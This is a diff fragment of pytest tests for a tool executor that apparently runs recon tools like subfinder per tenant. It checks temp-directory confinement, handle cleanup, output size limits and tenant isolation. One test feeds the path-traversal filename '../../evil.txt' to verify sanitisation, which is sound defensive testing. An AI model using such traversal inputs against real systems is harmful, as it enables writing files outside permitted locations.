+        assert Path(out_path).read_text().strip() == "hello_easm"
+
+    def test_file_handle_closed_after_execution(self):
+        """The file handle opened for stdout_file must be closed in finally."""
+        opened_handles = []
+        real_open = open
+
+        def _tracking_open(path, mode="r", **kwargs):
+            fh = real_open(path, mode, **kwargs)
+            opened_handles.append(fh)
+            return fh
+
+        proc = _make_mock_proc(stdout=None, stderr="")
+        with patch(_POPEN, return_value=proc):
+            with patch("builtins.open", side_effect=_tracking_open):
+                with SecureToolExecutor(tenant_id=1) as executor:
+                    out_path = str(executor.temp_dir / "out.json")
+                    executor.execute("subfinder", ["-d", "example.com"], stdout_file=out_path)
+
+        for h in opened_handles:
+            assert h.closed, f"File handle {h.name!r} was not closed"
+
+
+# 8. File operations
+
+
+class TestFileOperations:
+    """create_input_file() and read_output_file()"""
+
+    def test_create_input_file_writes_content(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            content = "example.com\ntest.org\n"
+            file_path = executor.create_input_file("domains.txt", content)
+            assert Path(file_path).read_text() == content
+
+    def test_create_input_file_inside_temp_dir(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            file_path = executor.create_input_file("targets.txt", "x")
+            assert str(executor.temp_dir) in file_path
+
+    def test_create_input_file_prevents_path_traversal(self):
+        """Filename with path separators is sanitized to basename only."""
+        with SecureToolExecutor(tenant_id=1) as executor:
+            file_path = executor.create_input_file("../../evil.txt", "bad")
+            assert str(executor.temp_dir) in file_path
+            assert "evil.txt" in file_path
+
+    def test_create_input_file_without_context_raises(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        with pytest.raises(ToolExecutionError, match="not initialized"):
+            executor.create_input_file("test.txt", "content")
+
+    def test_read_output_file_returns_content(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            expected = "result1\nresult2\n"
+            (executor.temp_dir / "output.txt").write_text(expected)
+            assert executor.read_output_file("output.txt") == expected
+
+    def test_read_nonexistent_file_returns_empty_string(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            assert executor.read_output_file("does_not_exist.txt") == ""
+
+    def test_read_output_file_without_context_raises(self):
+        executor = SecureToolExecutor(tenant_id=1)
+        with pytest.raises(ToolExecutionError, match="not initialized"):
+            executor.read_output_file("test.txt")
+
+    def test_read_output_file_too_large_raises(self):
+        with SecureToolExecutor(tenant_id=1) as executor:
+            big_file = executor.temp_dir / "huge.bin"
+            big_file.write_text("x")
+            max_size = executor.max_output_size
+
+            def fake_stat(self, **kwargs):
+                class _FakeStat:
+                    st_size = max_size + 1
+
+                return _FakeStat()
+
+            with patch.object(Path, "stat", fake_stat):
+                with pytest.raises(ToolExecutionError, match="too large"):
+                    executor.read_output_file("huge.bin")
+
+
+# 9. Tenant isolation
+
+
+class TestTenantIsolation:
+    """Per-tenant environment separation"""
+
+    def test_different_tenants_have_different_temp_dirs(self):
+        with SecureToolExecutor(tenant_id=1) as ex1:
+            with SecureToolExecutor(tenant_id=2) as ex2:
+                assert ex1.temp_dir != ex2.temp_dir
+
+    def test_tenant_files_do_not_cross_contaminate(self):
+        with SecureToolExecutor(tenant_id=1) as ex1:
+            with SecureToolExecutor(tenant_id=2) as ex2:
+                ex1.create_input_file("data.txt", "tenant1_secret")
+                ex2.create_input_file("data.txt", "tenant2_secret")
+
+                assert ex1.read_output_file("data.txt") == "tenant1_secret"
+                assert ex2.read_output_file("data.txt") == "tenant2_secret"
+
+    def test_tenant_id_reflected_in_temp_dir_name(self):
+        with SecureToolExecutor(tenant_id=42) as executor:
+            assert "tenant_42_" in str(executor.temp_dir)
